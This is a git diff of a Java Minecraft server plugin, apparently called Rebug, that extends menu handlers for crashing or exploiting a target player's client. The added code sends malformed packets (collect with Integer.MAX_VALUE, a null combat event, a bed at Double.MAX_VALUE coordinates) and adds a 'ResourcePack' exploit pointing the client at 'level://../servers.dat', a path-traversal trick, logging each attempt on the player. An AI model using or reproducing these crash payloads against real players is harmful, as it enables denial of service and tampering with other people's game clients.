@@ -4,9 +4,9 @@ import java.util.ArrayList;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.Location;
 import org.bukkit.Material;
 import org.bukkit.command.CommandSender;
-import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -14,6 +14,7 @@ import org.bukkit.event.inventory.*;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+
 import io.netty.buffer.Unpooled;
 import me.killstorm103.Rebug.Commands.Menu;
 import me.killstorm103.Rebug.Main.Rebug;
@@ -24,9 +25,12 @@ import net.minecraft.server.v1_8_R3.*;
 public class EventMenus implements Listener
 {
 	private Packet<?> packet = null;
+	@SuppressWarnings("unused")
+	private Location position;
 	private void CrashSendPacket (CommandSender sender, Player player, String mode, String spawncrashmode)
 	{
 		packet = null;
+		position = player.getLocation();
 		if (mode.equalsIgnoreCase("Server")) // Test in dev
 		{
 			packet = new PacketPlayOutCollect(player.getEntityId(), Integer.MAX_VALUE);
@@ -36,14 +40,31 @@ public class EventMenus implements Listener
 		}
 		if (mode.equalsIgnoreCase("Test"))
 		{
-			
+		//	packet = new PacketPlayOutUpdateSign(PT.getWorld(player), new BlockPosition(Double.MAX_VALUE, Double.POSITIVE_INFINITY, Double.NaN), new IChatBaseComponent[] {new ChatComponentText("Butt tickles")});
 			ItemStack item = Reset(new ItemStack(Material.ANVIL));
 			itemMeta.setDisplayName(ChatColor.DARK_RED + "Crash Anvil!");
+			item.setDurability((short) PT.randomNumber(Short.MAX_VALUE, 3));
 			item.setItemMeta(itemMeta);
 			player.setItemInHand(item);
+			packet = new PacketPlayOutCombatEvent(new CombatTracker(null), null);
+			PT.SendPacket(player, packet);
+			//PT.PlaceItem(player, player.getItemInHand(), new BlockPosition(PT.getEntityPlayer(player)).a(0, 1.5, 0), EnumDirection.UP, 0, 0, 0);
+		//	com.github.retrooper.packetevents.protocol.item.ItemStack item;
+		///	WrapperPlayClientPlayerBlockPlacement place = new WrapperPlayClientPlayerBlockPlacement(InteractionHand.MAIN_HAND, new Vector3i(player.getLocation().getBlockX(), player.getLocation().getBlockY() + 2, player.getLocation().getBlockZ()), BlockFace.UP, new Vector3i(player.getLocation().getBlockX(), player.getLocation().getBlockY() + 2, player.getLocation().getBlockZ()), item, true, 1);
+		///	PacketEvents.getAPI().getPlayerManager().sendPacket (place, place);
+			/*
 			net.minecraft.server.v1_8_R3.ItemStack stack = CraftItemStack.asNMSCopy(item);
-			PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutRelEntityMove(player.getEntityId(), (byte) player.getLocation().getBlockX(), (byte) player.getLocation().getBlockY(), (byte) player.getLocation().getBlockZ(), true));
-			PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutEntityLook(player.getEntityId(), (byte) 0, (byte) 90, true));
+			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
+			{
+				PT.SendPacket(player, new PacketPlayOutPosition(position.getBlockX(), position.getBlockY() + 1.5, position.getBlockZ(), position.getYaw(), 90, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i)));
+			}
+			*/
+			//PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutRelEntityMoveLook(player.getEntityId(), (byte) position.getBlockX(), (byte) ((byte) position.getBlockY() + 1.5), (byte) position.getBlockZ(), (byte) position.getYaw(), (byte) position.getPitch(), true));
+		//	stack.placeItem(PT.getEntityHuman(player), PT.getWorld(player), new BlockPosition(player.getLocation().getBlockX(), player.getLocation().getBlockY() - 1, player.getLocation().getBlockZ()), PT.getDirection(player), 0,0,0);
+			
+		//	PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutRelEntityMove(player.getEntityId(), (byte) player.getLocation().getBlockX(), (byte) player.getLocation().getBlockY(), (byte) player.getLocation().getBlockZ(), true));
+			//PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutEntityLook(player.getEntityId(), (byte) 0, (byte) 90, true));
+			//PT.PlaceItem(player, item, new BlockPosition(player.getLocation().getBlockX(), player.getLocation().getBlockY(), player.getLocation().getBlockZ()), PT.getDirection(player), 0, 0, 0);
 			//PT.PlaceItemWithPacket(player, new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), block, arg, arg2);
 		//	stack.getItem().interactWith(stack, PT.getEntityHuman(player), PT.getWorld(player), new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), EnumDirection.DOWN, 0, 0, 0);
 		//	stack.placeItem((EntityHuman) PT.getEntityPlayer(player), PT.getWorld(player),
@@ -110,9 +131,25 @@ public class EventMenus implements Listener
 			PT.CrashPlayer(sender, player, spawncrashmode);
 			PT.Log(sender, "tried crashing " + player.getName());
 		}
+		
+		
+		if (mode.equalsIgnoreCase("ResourcePack"))
+		{
+			packet = new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat");
+			PT.SendPacket(player, packet);
+			PT.Log(sender, "tried using the ResourcePack Crash Exploit on " + player.getName());
+		}
 	}
 	private void ExploitSendPacket (CommandSender sender, Player player, String exploit)
 	{
+		if (exploit.equalsIgnoreCase("ResourcePack"))
+		{
+			
+			//packet = new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat");
+			//PT.SendPacket(player, packet);
+			player.setResourcePack("level://../servers.dat");
+			PT.Log(sender, "tried using the ResourcePack exploit on " + player.getName());
+		}
 		if (exploit.equalsIgnoreCase("force sleep"))
 		{
 			packet = new PacketPlayOutBed(PT.getEntityPlayer(player), new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
@@ -152,10 +189,9 @@ public class EventMenus implements Listener
 	
 	private ItemStack Reset (ItemStack item)
 	{
-		this.item = null;
+		this.item = (ItemStack) (this.itemMeta =  null);
 		lore.clear();
 		this.item = item;
-		itemMeta = null;
 		itemMeta = this.item.getItemMeta();
 		
 		return this.item;
